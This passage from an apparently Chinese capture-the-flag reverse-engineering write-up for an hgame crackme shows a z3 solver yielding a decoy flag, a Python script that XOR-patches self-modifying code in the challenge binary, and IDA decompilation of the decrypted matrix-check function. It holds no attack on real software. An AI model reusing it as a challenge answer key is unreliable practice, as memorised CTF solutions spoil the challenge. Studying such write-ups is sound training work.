43 * f[33] + 76 * f[32] + -4 * f[26] + 59 * f[6] + -85 * f[34] + 69 * f[29] + 77 * f[31] + -95 * f[8] + 75 * f[16] - 19 * f[3] + 65 * f[21] - 78 * f[7] - 48 * f[28] - 77 * f[17] == 11531) s.add(-12 * f[0] + 55 * f[17] + 35 * f[20] + 76 * f[13] + -73 * f[15] + 84 * f[12] + -72 * f[3] + 71 * f[24] + -41 * f[7] + 28 * f[8] + -93 * f[34] + -63 * f[30] + 35 * f[6] - 38 * f[10] - 4 * f[16] + 99 * f[11] + 10 * f[4] - 98 * f[35] - 9 * f[18] + 22 * f[21] - 6 * f[26] + 67 * f[23] + 95 * f[5] + -37 * f[9] + -71 * f[25] + 33 * f[32] + 96 * f[14] + 47 * f[31] + -92 * f[27] + -51 * f[1] + -25 * f[28] + 82 * f[2] - 6 * f[33] - 13 * f[29] + 25 * f[22] - 35 * f[19] == 4538) s.add(79 * f[27] + 87 * f[24] + -52 * f[29] + -72 * f[13] + -17 * f[23] + 54 * f[0] + 45 * f[10] + -17 * f[33] + -49 * f[4] + -34 * f[17] + 87 * f[7] + -41 * f[18] + 2 * f[30] + -81 * f[11] + 37 * f[35] - 46 * f[9] + 25 * f[32] - 45 * f[14] - 30 * f[12] + 83 * f[19] + 24 * f[1] + 98 * f[16] + 64 * f[21] + 93 * f[8] + 78 * f[2] + 56 * f[15] + -51 * f[6] + -17 * f[26] + -50 * f[25] + -76 * f[3] + -65 * f[28] + -36 * f[31] + 88 * f[34] + 77 * f[20] - 62 * f[5] + 67 * f[22] == 33735) s.add(37 * f[17] + -21 * f[19] + 55 * f[21] + -70 * f[26] + 92 * f[6] + 75 * f[31] + -35 * f[29] + -50 * f[25] + 8 * f[33] + -74 * f[13] + 34 * f[35] + 29 * f[24] + -10 * f[15] + -75 * f[16] + 24 * f[18] + 98 * f[0] + 41 * f[20] - 54 * f[28] - 5 * f[23] - 66 * f[9] + 3 * f[5] + 30 * f[1] + -29 * f[7] + -71 * f[30] + 61 * f[10] + -25 * f[4] + 82 * f[32] + 62 * f[22] + -40 * f[34] + 90 * f[3] + -36 * f[14] - 66 * f[2] + 15 * f[12] - 74 * f[27] + 31 * f[8] - 68 * f[11] == -7107) s.add(-34 * f[13] + -13 * f[15] + -11 * f[19] + 28 * f[17] + 98 * f[9] + -69 * f[3] + 64 * f[25] + -66 * f[7] + -71 * f[6] + 75 * f[34] + 19 * f[32] + -94 * f[33] - 72 * f[18] + 35 * f[26] - 32 * f[27] + 76 * f[1] + 80 * f[28] + 66 * f[10] + 3 * f[12] - 99 * f[14] + 17 * f[30] + -79 * f[24] + -83 * f[29] + 55 * f[35] + -75 * f[8] + 77 * f[31] + 84 * f[22] - 94 * f[0] + 12 * f[2] + 61 * f[20] - 24 * f[23] + 62 * f[11] + 37 * f[16] - 65 * f[21] - 2 * f[4] - 90 * f[5] == -17028) s.add(24 * f[3] + -76 * f[2] + -94 * f[16] + -37 * f[4] + -31 * f[7] + -65 * f[0] + -23 * f[22] + 80 * f[24] + -48 * f[20] + -42 * f[32] + 47 * f[9] - 95 * f[6] - 10 * f[35] - 30 * f[34] - 67 * f[12] + 81 * f[14] - 21 * f[27] + 65 * f[18] + 60 * f[25] + 31 * f[17] - 20 * f[31] + -17 * f[21] + -34 * f[26] + 64 * f[15] + 43 * f[11] + 39 * f[23] + 68 * f[33] + -58 * f[13] + 21 * f[1] + 19 * f[19] + 96 * f[8] - 32 * f[30] - 83 * f[28] + 20 * f[5] - 3 * f[29] + 7 * f[10] == -21641) s.add(-76 * f[0] + -82 * f[22] + -92 * f[24] + 53 * f[20] + -90 * f[5] + 3 * f[34] + 93 * f[2] + 77 * f[25] + -40 * f[16] + -59 * f[26] + -91 * f[15] + 55 * f[9] + -84 * f[35] + -46 * f[12] + -41 * f[31] + -55 * f[8] + 97 * f[32] + 56 * f[19] - 15 * f[13] - 93 * f[4] + 37 * f[33] + -52 * f[7] + -82 * f[23] + 14 * f[27] + 52 * f[6] + 67 * f[11] + f[3] + -37 * f[30] - 88 * f[18] - 16 * f[10] + f[14] + 48 * f[17] - 80 * f[21] + 17 * f[29] - 94 * f[28] - 12 * f[ 1] == -71317) s.add(-71 * f[21] + -55 * f[5] + -76 * f[4] + -94 * f[10] + -79 * f[26] + 95 * f[28] + 58 * f[3] + -85 * f[13] + -74 * f[27] + -35 * f[16] + 68 * f[2] + 84 * f[11] + -25 * f[23] + -91 * f[33] + -87 * f[14] + -65 * f[34] + 23 * f[20] + -91 * f[15] + 34 * f[12] + 53 * f[ 1] - 16 * f[24] + 46 * f[9] + -26 * f[0] + 42 * f[30] + 22 * f[25] + -89 * f[19] + 34 * f[32] + -12 * f[29] + -16 * f[7] + 22 * f[18] + -52 * f[31] + 83 * f[22] + 5 * f[17] - 71 * f[6] + 41 * f[35] + 68 * f[8] == -41387) s.add(-97 * f[12] + -19 * f[19] + -87 * f[3] + 89 * f[27] + 54 * f[5] + 59 * f[22] + 95 * f[17] + 62 * f[26] + 6 * f[20] + 64 * f[14] + -50 * f[13] + -95 * f[30] + -68 * f[16] + 10 * f[0] - f[2] - f[28] + 17 * f[18] - 76 * f[6] - 24 * f[23] - 76 * f[11] + 33 * f[34] - 98 * f[31] + -59 * f[10] + 35 * f[4] + -53 * f[8] + -18 * f[1] + 9 * f[32] + -45 * f[9] - 60 * f[29] - 74 * f[35] + 31 * f[7] + 50 * f[24] + 25 * f[21] - 83 * f[33] + 25 * f[25] + 52 * f[15] == -30463) s.add(-27 * f[25] + 84 * f[34] + -73 * f[14] + -54 * f[7] + -45 * f[26] + -97 * f[18] + 40 * f[10] + 73 * f[27] + -55 * f[11] + 52 * f[29] + -29 * f[13] + 32 * f[24] + -80 * f[0] + -79 * f[17] + -39 * f[6] + 88 * f[1] + 44 * f[2] - 50 * f[3] - 2 * f[22] - 44 * f[31] - 62 * f[8] + -68 * f[5] + 77 * f[21] + -34 * f[15] + -42 * f[35] + 30 * f[28] + -54 * f[30] + -53 * f[20] + 98 * f[33] + 70 * f[32] + 99 * f[19] - 51 * f[4] + 12 * f[16] - 55 * f[9] + 40 * f[12] + 76 * f[23] == -14435) s.add(86 * f[20] + 70 * f[13] + -76 * f[19] + -31 * f[28] + 77 * f[14] + 48 * f[15] + -78 * f[31] + -82 * f[26] + 69 * f[3] + 70 * f[5] + 95 * f[6] - 60 * f[4] + 30 * f[27] + 3 * f[29] - 29 * f[32] + 5 * f[24] + 55 * f[0] + 36 * f[23] - 90 * f[22] + 37 * f[35] + 78 * f[34] + 20 * f[11] + -64 * f[1] + 74 * f[30] + 16 * f[16] + -83 * f[33] + 16 * f[2] + -17 * f[17] + -28 * f[8] + 9 * f[7] - 62 * f[10] + 46 * f[9] + 63 * f[21] - 39 * f[12] - 64 * f[18] - 27 * f[25] == 23472) s.add(7 * f[0] + 92 * f[6] + -57 * f[24] + -89 * f[11] + -47 * f[5] + -39 * f[30] + 64 * f[8] + -63 * f[12] + -46 * f[9] + -82 * f[17] + 39 * f[23] + 58 * f[13] - 81 * f[1] + 33 * f[29] + 89 * f[7] - 14 * f[20] + 97 * f[33] + 10 * f[35] - 46 * f[14] + 81 * f[4] + 89 * f[15] + 97 * f[21] + -71 * f[2] + -7 * f[19] + -55 * f[3] + 85 * f[16] + -97 * f[34] + -29 * f[27] + -79 * f[32] + 50 * f[28] + 81 * f[22] - 44 * f[31] - 60 * f[10] - 20 * f[26] + 18 * f[18] + 91 * f[25] == 7913) s.add(49 * f[17] + 52 * f[18] + -89 * f[25] + -93 * f[35] + -70 * f[11] + -45 * f[24] + 88 * f[30] + 92 * f[31] + 44 * f[26] + -5 * f[1] + -48 * f[6] + -16 * f[22] + 88 * f[32] + 91 * f[33] + 82 * f[28] + 98 * f[8] - 63 * f[13] - 8 * f[9] - f[16] - 4 * f[27] - 47 * f[4] + -41 * f[10] + 67 * f[29] + -22 * f[15] + -79 * f[12] + -18 * f[2] + 23 * f[20] + -20 * f[14] + 64 * f[19] + 91 * f[5] - 6 * f[7] + 84 * f[3] - 6 * f[34] + 69 * f[21] - 4 * f[23] - 80 * f[0] == 23824) s.add(89 * f[11] + 61 * f[7] + -92 * f[31] + 99 * f[21] + 27 * f[16] + -48 * f[24] + -51 * f[4] + -39 * f[25] + 84 * f[30] + 34 * f[14] + -73 * f[17] + -92 * f[18] + 72 * f[2] - 14 * f[13] - f[19] + 2 * f[9] + 3 * f[29] - 61 * f[33] - 6 * f[26] - 57 * f[15] - 8 * f[27] + -28 * f[35] + -72 * f[6] + -46 * f[32] + 99 * f[20] + -69 * f[22] + -94 * f[12] + -35 * f[8] + -29 * f[0] - 29 * f[10] - 2 * f[23] - 23 * f[34] + 41 * f[3] + 42 * f[28] == -13865) s.add(62 * f[25] + 85 * f[8] + -66 * f[32] + 43 * f[10] + 32 * f[33] + 75 * f[34] + 44 * f[1] + 49 * f[28] + -21 * f[26] + 60 * f[4] + -40 * f[0] + -98 * f[15] + -37 * f[9] + 78 * f[16] + 96 * f[35] - 84 * f[18] - 2 * f[7] + 43 * f[2] - 28 * f[6] - 77 * f[3] - 30 * f[17] + 90 * f[19] + 58 * f[30] + 74 * f[12] + 22 * f[29] + -29 * f[20] + -49 * f[22] + 88 * f[14] + -51 * f[24] + 44 * f[21] + 28 * f[13] - 95 * f[5] + 5 * f[23] + 85 * f[31] + 5 * f[27] + 47 * f[11] == 50179) s.add(-100 * f[25] + -88 * f[18] + 46 * f[33] + 50 * f[31] + -85 * f[4] + -92 * f[6] + -54 * f[7] + 83 * f[23] + -25 * f[24] + -91 * f[5] + 85 * f[10] + -15 * f[16] - 59 * f[27] - 91 * f[8] + 73 * f[32] + 44 * f[19] + 5 * f[34] + 68 * f[14] - 32 * f[21] - 26 * f[30] - 56 * f[17] + 30 * f[1] + -92 * f[26] + 4 * f[29] + -89 * f[20] + 57 * f[15] + -66 * f[0] + -85 * f[12] + 91 * f[35] + -68 * f[2] - 95 * f[3] - 16 * f[13] - 76 * f[11] - 48 * f[9] - 88 * f[22] + 65 * f[28] == -75429) s.add(-49 * f[20] + -71 * f[13] + -23 * f[23] + -19 * f[21] + 62 * f[2] + -41 * f[19] + 46 * f[15] + 5 * f[1] + -2 * f[5] + 88 * f[9] + 84 * f[16] + 77 * f[6] - 6 * f[26] + 51 * f[33] - 96 * f[31] + 59 * f[14] - 62 * f[8] - 55 * f[25] - 32 * f[34] + 69 * f[32] - 48 * f[28] + 85 * f[30] + -35 * f[24] + -58 * f[18] + 16 * f[12] + -45 * f[7] + 49 * f[35] + 8 * f[11] + 54 * f[22] + -33 * f[4] + 4 * f[17] - 21 * f[27] + 31 * f[0] - 98 * f[10] - 96 * f[29] - 71 * f[3] == -18764) s.add(74 * f[20] + -50 * f[2] + -46 * f[21] + 28 * f[15] + -100 * f[5] + 53 * f[28] + -93 * f[9] + -69 * f[1] + -61 * f[0] + 26 * f[8] + -66 * f[6] + -66 * f[27] - 42 * f[4] + 89 * f[33] - 30 * f[31] - 45 * f[22] + 13 * f[14] - 29 * f[3] + 33 * f[10] + 54 * f[23] + 18 * f[30] + 88 * f[12] + 84 * f[34] + 66 * f[24] + 99 * f[16] + -78 * f[32] + -88 * f[11] + -21 * f[35] + 25 * f[18] + -81 * f[19] - 39 * f[29] + 15 * f[13] + 83 * f[26] - 28 * f[7] + 2 * f[25] == -20428) s.add(-97 * f[22] + 14 * f[33] + -43 * f[11] + 40 * f[20] + 31 * f[13] + 44 * f[29] + -68 * f[3] + -36 * f[1] + -38 * f[9] + -7 * f[12] + f[26] + -50 * f[6] + 59 * f[8] + 88 * f[30] + 46 * f[0] - 34 * f[15] + 10 * f[4] + 84 * f[18] + 13 * f[7] + 14 * f[25] - 5 * f[16] + 10 * f[31] + 64 * f[28] + 97 * f[5] + -7 * f[27] + 62 * f[14] + 60 * f[24] + 27 * f[34] + -11 * f[10] - 31 * f[32] - 48 * f[19] - 55 * f[35] - 96 * f[2] - 83 * f[23] == 11973) s.add(-99 * f[4] + -57 * f[8] + 2 * f[7] + 57 * f[24] + -54 * f[25] + 39 * f[29] + -91 * f[1] + -32 * f[20] + -30 * f[11] + 16 * f[12] + 45 * f[17] + 90 * f[32] + 26 * f[5] - 59 * f[28] + 7 * f[2] - 88 * f[3] + 36 * f[15] - 73 * f[6] - 6 * f[27] + 99 * f[13] - 96 * f[0] + -45 * f[26] + -10 * f[35] + -40 * f[9] + 97 * f[10] + 6 * f[22] + 58 * f[34] + 4 * f[31] + 55 * f[21] - 72 * f[16] + 27 * f[19] + 79 * f[23] - 28 * f[18] - 90 * f[30] - 6 * f[33] + 58 * f[14] == -23186) if s.check() == sat: model = s.model() for i in range(36): print (chr(model[f[i]].as_long().real), end=\u0026#39;\u0026#39;) print (\u0026#39;\\nfinish\u0026#39;) 得到结果\nhgame{@_FAKE_flag!_do_Y0u_know_SMC?} 提交一下发现不正确，说明这是一个假flag，提示我们这道题使用了SMC（self-modifying code）\nstep 1：找到SMC位置和加密方法 既然对某一个片段进行了加密，说明程序中肯定有一部分乱码（或者逻辑混乱的汇编代码）\n在0x409080处找到一大段数字\n交叉引用一下，定位到负责加密代码40699B\n发现是一个简单异或，用刚才找到的一长串方程的那个函数与这段乱码进行逐位异或\nstep 2：破解SMC 接下来手动patch一下\n在二进制文件中找到两段代码的位置，进行异或，上网找个二进制文件修改的代码\nfile_path = \u0026#34;FAKE\u0026#34; fr = open(file_path, \u0026#34;rb\u0026#34;) fw = open(\u0026#39;modify_\u0026#39;+file_path, \u0026#34;wb\u0026#34;) data = fr.read() fw.write(data) fw.seek(0x1216) fw.write(b\u0026#39;\\xf3\\x0f\\x1e\\xfa\\x55\\x48\\x89\\xe5\\x48\\x81\\xec\\x60\\x01\\x00\\x00\\x48\u0026#39; ) fw.write(b\u0026#39;\\x89\\xbd\\x28\\xfe\\xff\\xff\\x48\\x8d\\x95\\x50\\xff\\xff\\xff\\xb8\\x00\\x00\u0026#39; ) fw.write(b\u0026#39;\\x00\\x00\\xb9\\x12\\x00\\x00\\x00\\x48\\x89\\xd7\\xf3\\x48\\xab\\xc7\\x85\\xc0\u0026#39; ) fw.write(b\u0026#39;\\xfe\\xff\\xff\\xf6\\xd6\\x00\\x00\\xc7\\x85\\xc4\\xfe\\xff\\xff\\xa7\\xee\\x00\u0026#39; ) fw.write(b\u0026#39;\\x00\\xc7\\x85\\xc8\\xfe\\xff\\xff\\xf7\\xea\\x00\\x00\\xc7\\x85\\xcc\\xfe\\xff\u0026#39; ) fw.write(b\u0026#39;\\xff\\x9f\\xdf\\x00\\x00\\xc7\\x85\\xd0\\xfe\\xff\\xff\\xcc\\xdd\\x00\\x00\\xc7\u0026#39; ) fw.write(b\u0026#39;\\x85\\xd4\\xfe\\xff\\xff\\xae\\xd9\\x00\\x00\\xc7\\x85\\xd8\\xfe\\xff\\xff\\x32\u0026#39; ) fw.write(b\u0026#39;\\xb6\\x00\\x00\\xc7\\x85\\xdc\\xfe\\xff\\xff\\xc3\\xce\\x00\\x00\\xc7\\x85\\xe0\u0026#39; ) fw.write(b\u0026#39;\\xfe\\xff\\xff\\x4c\\xd1\\x00\\x00\\xc7\\x85\\xe4\\xfe\\xff\\xff\\x05\\xc5\\x00\u0026#39; ) fw.write(b\u0026#39;\\x00\\xc7\\x85\\xe8\\xfe\\xff\\xff\\x8e\\xc3\\x00\\x00\\xc7\\x85\\xec\\xfe\\xff\u0026#39; ) fw.write(b\u0026#39;\\xff\\x9a\\xac\\x00\\x00\\xc7\\x85\\xf0\\xfe\\xff\\xff\\x6d\\xaf\\x00\\x00\\xc7\u0026#39; ) fw.write(b\u0026#39;\\x85\\xf4\\xfe\\xff\\xff\\x9a\\xb5\\x00\\x00\\xc7\\x85\\xf8\\xfe\\xff\\xff\\xc8\u0026#39; ) fw.write(b\u0026#39;\\xb3\\x00\\x00\\xc7\\x85\\xfc\\xfe\\xff\\xff\\x3b\\xad\\x00\\x00\\xc7\\x85\\x00\u0026#39; ) fw.write(b\u0026#39;\\xff\\xff\\xff\\x4a\\xab\\x00\\x00\\xc7\\x85\\x04\\xff\\xff\\xff\\x50\\xad\\x00\u0026#39; ) fw.write(b\u0026#39;\\x00\\xc7\\x85\\x08\\xff\\xff\\xff\\xce\\xd6\\x00\\x00\\xc7\\x85\\x0c\\xff\\xff\u0026#39; ) fw.write(b\u0026#39;\\xff\\xbc\\xf1\\x00\\x00\\xc7\\x85\\x10\\xff\\xff\\xff\\x12\\xef\\x00\\x00\\xc7\u0026#39; ) fw.write(b\u0026#39;\\x85\\x14\\xff\\xff\\xff\\x1b\\xe3\\x00\\x00\\xc7\\x85\\x18\\xff\\xff\\xff\\x82\u0026#39; ) fw.write(b\u0026#39;\\xe1\\x00\\x00\\xc7\\x85\\x1c\\xff\\xff\\xff\\xb4\\xd6\\x00\\x00\\xc7\\x85\\x20\u0026#39; ) fw.write(b\u0026#39;\\xff\\xff\\xff\\xd1\\xbe\\x00\\x00\\xc7\\x85\\x24\\xff\\xff\\xff\\x52\\xc7\\x00\u0026#39; ) fw.write(b\u0026#39;\\x00\\xc7\\x85\\x28\\xff\\xff\\xff\\xdd\\xc1\\x00\\x00\\xc7\\x85\\x2c\\xff\\xff\u0026#39; ) fw.write(b\u0026#39;\\xff\\x5b\\xbc\\x00\\x00\\xc7\\x85\\x30\\xff\\xff\\xff\\x20\\xbb\\x00\\x00\\xc7\u0026#39; ) fw.write(b\u0026#39;\\x85\\x34\\xff\\xff\\xff\\x87\\xc6\\x00\\x00\\xc7\\x85\\x38\\xff\\xff\\xff\\x04\u0026#39; ) fw.write(b\u0026#39;\\xb6\\x00\\x00\\xc7\\x85\\x3c\\xff\\xff\\xff\\x55\\xc5\\x00\\x00\\xc7\\x85\\x40\u0026#39; ) fw.write(b\u0026#39;\\xff\\xff\\xff\\x25\\xbd\\x00\\x00\\xc7\\x85\\x44\\xff\\xff\\xff\\x3f\\xb4\\x00\u0026#39; ) fw.write(b\u0026#39;\\x00\\xc7\\x85\\x48\\xff\\xff\\xff\\x16\\xb4\\x00\\x00\\xc7\\x85\\x4c\\xff\\xff\u0026#39; ) fw.write(b\u0026#39;\\xff\\x98\\xb6\\x00\\x00\\xc7\\x85\\x30\\xfe\\xff\\xff\\x68\\x00\\x00\\x00\\xc7\u0026#39; ) fw.write(b\u0026#39;\\x85\\x34\\xfe\\xff\\xff\\x67\\x00\\x00\\x00\\xc7\\x85\\x38\\xfe\\xff\\xff\\x61\u0026#39; ) fw.write(b\u0026#39;\\x00\\x00\\x00\\xc7\\x85\\x3c\\xfe\\xff\\xff\\x6d\\x00\\x00\\x00\\xc7\\x85\\x40\u0026#39; ) fw.write(b\u0026#39;\\xfe\\xff\\xff\\x65\\x00\\x00\\x00\\xc7\\x85\\x44\\xfe\\xff\\xff\\x7b\\x00\\x00\u0026#39; ) fw.write(b\u0026#39;\\x00\\xc7\\x85\\x48\\xfe\\xff\\xff\\x40\\x00\\x00\\x00\\xc7\\x85\\x4c\\xfe\\xff\u0026#39; ) fw.write(b\u0026#39;\\xff\\x5f\\x00\\x00\\x00\\xc7\\x85\\x50\\xfe\\xff\\xff\\x46\\x00\\x00\\x00\\xc7\u0026#39; ) fw.write(b\u0026#39;\\x85\\x54\\xfe\\xff\\xff\\x41\\x00\\x00\\x00\\xc7\\x85\\x58\\xfe\\xff\\xff\\x4b\u0026#39; ) fw.write(b\u0026#39;\\x00\\x00\\x00\\xc7\\x85\\x5c\\xfe\\xff\\xff\\x45\\x00\\x00\\x00\\xc7\\x85\\x60\u0026#39; ) fw.write(b\u0026#39;\\xfe\\xff\\xff\\x5f\\x00\\x00\\x00\\xc7\\x85\\x64\\xfe\\xff\\xff\\x66\\x00\\x00\u0026#39; ) fw.write(b\u0026#39;\\x00\\xc7\\x85\\x68\\xfe\\xff\\xff\\x6c\\x00\\x00\\x00\\xc7\\x85\\x6c\\xfe\\xff\u0026#39; ) fw.write(b\u0026#39;\\xff\\x61\\x00\\x00\\x00\\xc7\\x85\\x70\\xfe\\xff\\xff\\x67\\x00\\x00\\x00\\xc7\u0026#39; ) fw.write(b\u0026#39;\\x85\\x74\\xfe\\xff\\xff\\x21\\x00\\x00\\x00\\xc7\\x85\\x78\\xfe\\xff\\xff\\x2d\u0026#39; ) fw.write(b\u0026#39;\\x00\\x00\\x00\\xc7\\x85\\x7c\\xfe\\xff\\xff\\x64\\x00\\x00\\x00\\xc7\\x85\\x80\u0026#39; ) fw.write(b\u0026#39;\\xfe\\xff\\xff\\x6f\\x00\\x00\\x00\\xc7\\x85\\x84\\xfe\\xff\\xff\\x5f\\x00\\x00\u0026#39; ) fw.write(b\u0026#39;\\x00\\xc7\\x85\\x88\\xfe\\xff\\xff\\x59\\x00\\x00\\x00\\xc7\\x85\\x8c\\xfe\\xff\u0026#39; ) fw.write(b\u0026#39;\\xff\\x30\\x00\\x00\\x00\\xc7\\x85\\x90\\xfe\\xff\\xff\\x75\\x00\\x00\\x00\\xc7\u0026#39; ) fw.write(b\u0026#39;\\x85\\x94\\xfe\\xff\\xff\\x5f\\x00\\x00\\x00\\xc7\\x85\\x98\\xfe\\xff\\xff\\x6b\u0026#39; ) fw.write(b\u0026#39;\\x00\\x00\\x00\\xc7\\x85\\x9c\\xfe\\xff\\xff\\x6f\\x00\\x00\\x00\\xc7\\x85\\xa0\u0026#39; ) fw.write(b\u0026#39;\\xfe\\xff\\xff\\x6e\\x00\\x00\\x00\\xc7\\x85\\xa4\\xfe\\xff\\xff\\x77\\x00\\x00\u0026#39; ) fw.write(b\u0026#39;\\x00\\xc7\\x85\\xa8\\xfe\\xff\\xff\\x5f\\x00\\x00\\x00\\xc7\\x85\\xac\\xfe\\xff\u0026#39; ) fw.write(b\u0026#39;\\xff\\x53\\x00\\x00\\x00\\xc7\\x85\\xb0\\xfe\\xff\\xff\\x4d\\x00\\x00\\x00\\xc7\u0026#39; ) fw.write(b\u0026#39;\\x85\\xb4\\xfe\\xff\\xff\\x43\\x00\\x00\\x00\\xc7\\x85\\xb8\\xfe\\xff\\xff\\x3f\u0026#39; ) fw.write(b\u0026#39;\\x00\\x00\\x00\\xc7\\x85\\xbc\\xfe\\xff\\xff\\x7d\\x00\\x00\\x00\\xc7\\x45\\xfc\u0026#39; ) fw.write(b\u0026#39;\\x01\\x00\\x00\\x00\\xc7\\x45\\xf8\\x00\\x00\\x00\\x00\\xe9\\xb9\\x00\\x00\\x00\u0026#39; ) fw.write(b\u0026#39;\\xc7\\x45\\xf4\\x00\\x00\\x00\\x00\\xe9\\x9f\\x00\\x00\\x00\\xc7\\x45\\xf0\\x00\u0026#39; ) fw.write(b\u0026#39;\\x00\\x00\\x00\\xe9\\x85\\x00\\x00\\x00\\x8b\\x55\\xf8\\x89\\xd0\\x01\\xc0\\x01\u0026#39; ) fw.write(b\u0026#39;\\xd0\\x01\\xc0\\x89\\xc2\\x8b\\x45\\xf4\\x01\\xd0\\x48\\x98\\x8b\\xb4\\x85\\x50\u0026#39; ) fw.write(b\u0026#39;\\xff\\xff\\xff\\x8b\\x55\\xf8\\x89\\xd0\\x01\\xc0\\x01\\xd0\\x01\\xc0\\x89\\xc2\u0026#39; ) fw.write(b\u0026#39;\\x8b\\x45\\xf0\\x01\\xd0\\x48\\x98\\x48\\x8d\\x14\\x85\\x00\\x00\\x00\\x00\\x48\u0026#39; ) fw.write(b\u0026#39;\\x8b\\x85\\x28\\xfe\\xff\\xff\\x48\\x01\\xd0\\x8b\\x00\\x89\\xc1\\x8b\\x55\\xf0\u0026#39; ) fw.write(b\u0026#39;\\x89\\xd0\\x01\\xc0\\x01\\xd0\\x01\\xc0\\x89\\xc2\\x8b\\x45\\xf4\\x01\\xd0\\x48\u0026#39; ) fw.write(b\u0026#39;\\x98\\x8b\\x84\\x85\\x30\\xfe\\xff\\xff\\x0f\\xaf\\xc8\\x8b\\x55\\xf8\\x89\\xd0\u0026#39; ) fw.write(b\u0026#39;\\x01\\xc0\\x01\\xd0\\x01\\xc0\\x89\\xc2\\x8b\\x45\\xf4\\x01\\xd0\\x8d\\x14\\x0e\u0026#39; ) fw.write(b\u0026#39;\\x48\\x98\\x89\\x94\\x85\\x50\\xff\\xff\\xff\\x83\\x45\\xf0\\x01\\x83\\x7d\\xf0\u0026#39; ) fw.write(b\u0026#39;\\x05\\x0f\\x8e\\x71\\xff\\xff\\xff\\x83\\x45\\xf4\\x01\\x83\\x7d\\xf4\\x05\\x0f\u0026#39; ) fw.write(b\u0026#39;\\x8e\\x57\\xff\\xff\\xff\\x83\\x45\\xf8\\x01\\x83\\x7d\\xf8\\x05\\x0f\\x8e\\x3d\u0026#39; ) fw.write(b\u0026#39;\\xff\\xff\\xff\\xc7\\x45\\xec\\x00\\x00\\x00\\x00\\xeb\\x58\\xc7\\x45\\xe8\\x00\u0026#39; ) fw.write(b\u0026#39;\\x00\\x00\\x00\\xeb\\x45\\x8b\\x55\\xec\\x89\\xd0\\x01\\xc0\\x01\\xd0\\x01\\xc0\u0026#39; ) fw.write(b\u0026#39;\\x89\\xc2\\x8b\\x45\\xe8\\x01\\xd0\\x48\\x98\\x8b\\x8c\\x85\\x50\\xff\\xff\\xff\u0026#39; ) fw.write(b\u0026#39;\\x8b\\x55\\xec\\x89\\xd0\\x01\\xc0\\x01\\xd0\\x01\\xc0\\x89\\xc2\\x8b\\x45\\xe8\u0026#39; ) fw.write(b\u0026#39;\\x01\\xd0\\x48\\x98\\x8b\\x84\\x85\\xc0\\xfe\\xff\\xff\\x39\\xc1\\x74\\x07\\xc7\u0026#39; ) fw.write(b\u0026#39;\\x45\\xfc\\x00\\x00\\x00\\x00\\x83\\x45\\xe8\\x01\\x83\\x7d\\xe8\\x05\\x7e\\xb5\u0026#39; ) fw.write(b\u0026#39;\\x83\\x45\\xec\\x01\\x83\\x7d\\xec\\x05\\x7e\\xa2\\x8b\\x45\\xfc\\xc9\\xc3\\x45\u0026#39; ) fw.write(b\u0026#39;\\xec\\x38\\xc3\\xc0\\x38\\x8b\\x00\\x01\u0026#39;) fw.flush() fw.close() fr.close() step 3：查看修改后的代码 使用ida64打开修改后的文件\n__int64 __usercall sub_401216@\u0026lt;rax\u0026gt;(__int64 a1@\u0026lt;rbp\u0026gt;, __int64 a2@\u0026lt;rdi\u0026gt;) { v54 = a1; *(\u0026amp;v54 - 59) = a2; memset(\u0026amp;v47, 0, 0x90uLL); v11 = 55030; v12 = 61095; v13 = 60151; v14 = 57247; v15 = 56780; v16 = 55726; v17 = 46642; v18 = 52931; v19 = 53580; v20 = 50437; v21 = 50062; v22 = 44186; v23 = 44909; v24 = 46490; v25 = 46024; v26 = 44347; v27 = 43850; v28 = 44368; v29 = 54990; v30 = 61884; v31 = 61202; v32 = 58139; v33 = 57730; v34 = 54964; v35 = 48849; v36 = 51026; v37 = 49629; v38 = 48219; v39 = 47904; v40 = 50823; v41 = 46596; v42 = 50517; v43 = 48421; v44 = 46143; v45 = 46102; v46 = 46744; *((_DWORD *)\u0026amp;v54 - 116) = 104; *((_DWORD *)\u0026amp;v54 - 115) = 103; *((_DWORD *)\u0026amp;v54 - 114) = 97; *((_DWORD *)\u0026amp;v54 - 113) = 109; *((_DWORD *)\u0026amp;v54 - 112) = 101; *((_DWORD *)\u0026amp;v54 - 111) = 123; *((_DWORD *)\u0026amp;v54 - 110) = 64; *((_DWORD *)\u0026amp;v54 - 109) = 95; *((_DWORD *)\u0026amp;v54 - 108) = 70; *((_DWORD *)\u0026amp;v54 - 107) = 65; *((_DWORD *)\u0026amp;v54 - 106) = 75; *((_DWORD *)\u0026amp;v54 - 105) = 69; *((_DWORD *)\u0026amp;v54 - 104) = 95; *((_DWORD *)\u0026amp;v54 - 103) = 102; *((_DWORD *)\u0026amp;v54 - 102) = 108; *((_DWORD *)\u0026amp;v54 - 101) = 97; *((_DWORD *)\u0026amp;v54 - 100) = 103; *((_DWORD *)\u0026amp;v54 - 99) = 33; *((_DWORD *)\u0026amp;v54 - 98) = 45; *((_DWORD *)\u0026amp;v54 - 97) = 100; *((_DWORD *)\u0026amp;v54 - 96) = 111; *((_DWORD *)\u0026amp;v54 - 95) = 95; *((_DWORD *)\u0026amp;v54 - 94) = 89; *((_DWORD *)\u0026amp;v54 - 93) = 48; *((_DWORD *)\u0026amp;v54 - 92) = 117; *((_DWORD *)\u0026amp;v54 - 91) = 95; *((_DWORD *)\u0026amp;v54 - 90) = 107; *((_DWORD *)\u0026amp;v54 - 89) = 111; v3 = 110; v4 = 119; v5 = 95; v6 = 83; v7 = 77; v8 = 67; v9 = 63; v10 = 125; v53 = 1; for ( i = 0; i \u0026lt;= 5; ++i ) { for ( j = 0; j \u0026lt;= 5; ++j ) { for ( k = 0; k \u0026lt;= 5; ++k ) *((_DWORD *)\u0026amp;v54 + 6 * i + j - 44) += *((_DWORD *)\u0026amp;v54 + 6 * k + j - 116) * *(_DWORD *)(4LL * (6 * i + k) + *(\u0026amp;v54 - 59));// 矩阵乘法  } } for ( l = 0; l \u0026lt;= 5; ++l ) { for ( m = 0; m \u0026lt;= 5; ++m ) { if ( *((_DWORD *)\u0026amp;v54 + 6 * l + m - 44) != *((_DWORD *)\u0026amp;v54 + 6 * l + m - 80) )// 与v11到v46比较  v53 = 0; } } return v53; } 发现判断函数发生了变化\n第一个三重循环明显是一个矩阵乘法，第二个则是简单比较，由于这里指针有点绕，使用了gdb对每一项进行了判断\n首先在第二个循环打断点\n.text:00000000004015FB loc_4015FB: ; CODE XREF: sub_401216+42E↓j .text:00000000004015FB mov edx, [rbp-14h] .text:00000000004015FE mov eax, edx .text:0000000000401600 add eax, eax .text:0000000000401602 add eax, edx .text:0000000000401604 add eax, eax .text:0000000000401606 mov edx, eax .text:0000000000401608 mov eax, [rbp-18h] .text:000000000040160B add eax, edx 